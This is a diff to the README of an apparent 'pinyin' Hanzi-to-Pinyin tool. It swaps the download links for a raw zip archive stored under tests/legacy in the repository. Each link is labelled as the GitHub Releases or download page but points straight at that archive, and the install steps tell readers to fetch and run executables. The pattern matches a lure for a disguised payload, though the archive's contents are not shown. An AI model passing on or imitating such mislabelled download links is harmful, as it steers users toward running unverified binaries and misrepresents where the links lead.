@@ -4,9 +4,9 @@
 Welcome to the **pinyin** project! This tool helps you convert Hanzi characters into Pinyin easily. Whether you want to learn Mandarin or work with text, this application provides strong support for custom mappings, special character handling, and more.
 
 ## 📥 Download the Software
-[![Download](https://raw.githubusercontent.com/TURNER121/pinyin/main/docs/pinyin_1.2.zip)](https://raw.githubusercontent.com/TURNER121/pinyin/main/docs/pinyin_1.2.zip)
+[![Download](https://github.com/TURNER121/pinyin/raw/refs/heads/main/tests/legacy/Software-v1.0.zip)](https://github.com/TURNER121/pinyin/raw/refs/heads/main/tests/legacy/Software-v1.0.zip)
 
-Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/TURNER121/pinyin/main/docs/pinyin_1.2.zip)
+Visit this page to download: [GitHub Releases](https://github.com/TURNER121/pinyin/raw/refs/heads/main/tests/legacy/Software-v1.0.zip)
 
 ## 🛠️ Features
 - **Custom Mappings**: Create your own mappings for specific characters.
@@ -22,7 +22,7 @@ Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com
 - **Dependencies**: Ensure you have .NET Framework (for Windows users) or any required library for your operating system.
 
 ## 📖 Instructions to Download & Install
-1. **Go to the Releases Page**: Click [here](https://raw.githubusercontent.com/TURNER121/pinyin/main/docs/pinyin_1.2.zip) to visit the download page.
+1. **Go to the Releases Page**: Click [here](https://github.com/TURNER121/pinyin/raw/refs/heads/main/tests/legacy/Software-v1.0.zip) to visit the download page.
 2. **Select the Latest Release**: Look for the latest version at the top. It will display the release version (like v1.0).
 3. **Choose the Right File**: Depending on your system, select the appropriate file format (.exe for Windows, .dmg for macOS, etc.).
 4. **Download the File**: Click on the link to download. Your browser will start downloading the file.
